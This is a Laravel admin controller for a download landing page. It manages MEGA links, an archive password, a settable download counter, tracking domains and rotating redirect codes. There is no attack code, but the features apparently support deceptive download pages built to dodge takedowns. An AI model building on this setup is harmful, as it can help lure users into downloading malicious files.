<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\LanderSetting;
use App\Models\MegaUrl;
use App\Models\TrackingDomain;
use Illuminate\Http\Request;

class LanderController extends Controller
{
    public function index()
    {
        $settings = LanderSetting::current();
        $settings->load('activeLanderDomain', 'redirectFrontDomain');
        $megaUrls        = MegaUrl::orderByDesc('created_at')->get();
        $trackingDomains = TrackingDomain::orderByDesc('is_active')->orderBy('domain')->get();

        return view('admin.lander.index', compact('settings', 'megaUrls', 'trackingDomains'));
    }

    public function update(Request $request)
    {
        $data = $request->validate([
            'mega_url'         => 'nullable|string|max:2000',
            'archive_password' => 'nullable|string|max:100',
            'color_scheme'     => 'required|in:dark-red,dark-blue,dark-green,dark-purple,neon-cyan,amber-gold',
            'page_title'       => 'required|string|max:200',
            'download_count'   => 'required|integer|min:0',
            'show_password'    => 'sometimes|boolean',
            'show_checks'      => 'sometimes|boolean',
        ]);

        $data['show_password'] = $request->boolean('show_password');
        $data['show_checks']   = $request->boolean('show_checks');

        LanderSetting::current()->update($data);

        return back()->with('success', 'Lander settings saved successfully.');
    }

    public function setActiveDomain(Request $request)
    {
        $request->validate(['domain_id' => 'required|exists:tracking_domains,id']);

        LanderSetting::current()->update(['active_lander_domain_id' => $request->domain_id]);

        $domain = TrackingDomain::find($request->domain_id);
        return back()->with('success', "Active lander domain switched to {$domain->domain}. All redirect links now point here.");
    }

    public function generateRedirectLink(Request $request)
    {
        $request->validate(['front_domain_id' => 'required|exists:tracking_domains,id']);

        $code = $this->freshCode();

        LanderSetting::current()->update([
            'redirect_front_domain_id' => $request->front_domain_id,
            'redirect_code'            => $code,
        ]);

        return back()->with('success', 'New redirect link generated. Share the new URL.');
    }

    public function rotateRedirectCode()
    {
        LanderSetting::current()->update(['redirect_code' => $this->freshCode()]);

        return back()->with('success', 'Code rotated. Old shareable link is now dead — use the new one.');
    }

    public function storeMegaUrl(Request $request)
    {
        $data = $request->validate([
            'nickname' => 'required|string|max:100',
            'url'      => 'required|string|max:2000',
            'notes'    => 'nullable|string|max:500',
        ]);

        MegaUrl::create($data);

        return back()->with('success', 'MEGA URL saved to vault.');
    }

    public function destroyMegaUrl(MegaUrl $megaUrl)
    {
        $megaUrl->delete();

        return back()->with('success', 'URL removed from vault.');
    }

    public function useMegaUrl(MegaUrl $megaUrl)
    {
        LanderSetting::current()->update(['mega_url' => $megaUrl->url]);

        return back()->with('success', "Now using \"{$megaUrl->nickname}\" as the active MEGA link.");
    }

    private function freshCode(): string
    {
        do {
            $code = strtoupper(substr(str_replace(['+', '/', '='], '', base64_encode(random_bytes(8))), 0, 10));
        } while (LanderSetting::where('redirect_code', $code)->exists());

        return $code;
    }
}
